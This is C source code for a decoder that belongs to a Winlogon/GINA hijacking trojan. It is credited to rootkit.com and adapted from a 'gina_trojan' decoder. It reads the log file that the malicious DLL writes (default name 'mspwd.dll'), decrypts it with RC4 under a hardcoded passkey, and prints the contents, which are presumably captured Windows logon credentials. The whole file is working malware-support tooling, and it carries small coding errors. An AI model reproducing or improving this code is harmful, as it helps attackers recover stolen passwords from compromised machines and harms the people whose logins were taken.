////////////////////////////////////////////////////////////////////
//
// Winlogonhijack Logdecode Written by JeFFOsZ.
//
// This program decrypts the crypted output file from Winlogonhijack 
// dll.
// Thx 2 the author of gina_trojan :) This is actually a version of
// Gina_Decode which is a little bit modified
//
////////////////////////////////////////////////////////////////////

#define PASSKEY "1dsf4dsqfsd86sdl" // 16 char long passkey for rc4 

#include <windows.h>
#include <stdio.h>
#include "openssl\rc4.h"
#pragma comment (lib,"libeay32")

RC4_KEY global_key;

unsigned char *inbuff;
unsigned char *outbuff;
HANDLE hFile;
BOOL bSuccess = FALSE;
LPSTR pszFileName="mspwd.dll";


int main( int argc, char* argv[])
{
	printf("Ghetto Gina Decoder v1.0 - visit RootKit.com\n");
	printf("Modified by JeFFOsZ for Winlogonhijack v0.3\n\n");
	
	if (argc<2)
	{
		printf("Usage: %s [filename.xxx]\n\n");
		return 1;
	}

	printf("Ghetto Decoding: %s\n\n", argv[1]);
	SetConsoleTitle("Ghetto Gina Decoder v1.0");

	inbuff = (unsigned char *)GlobalAlloc(GPTR, 400);
	outbuff = (unsigned char *)GlobalAlloc(GPTR, 400);

	lstrcpy(pszFileName, argv[1]);

    hFile = CreateFile(pszFileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if(hFile != INVALID_HANDLE_VALUE)
    {
      DWORD dwFileSize;
      dwFileSize = GetFileSize(hFile, NULL);
      if(dwFileSize != 0xFFFFFFFF)
      {
            DWORD dwRead=0;
			int count=0;
			
			do {
				if(ReadFile(hFile, inbuff, 400, &dwRead, NULL))
				{
					inbuff[399] = '\0'; // Null
					RC4_set_key(&global_key, 16, PASSKEY);
					RC4(&global_key, 400, inbuff, outbuff);
					count++;
					printf("%d\t%s\n", count, outbuff);
				}
			} while (dwRead!=0);
			
			printf("\nSuccess.\n");
      }
      else
	  {
		  printf("Error opening file. Exiting.\n");
		  return 2;
	  }

	  CloseHandle(hFile);
   }

   return 0;
}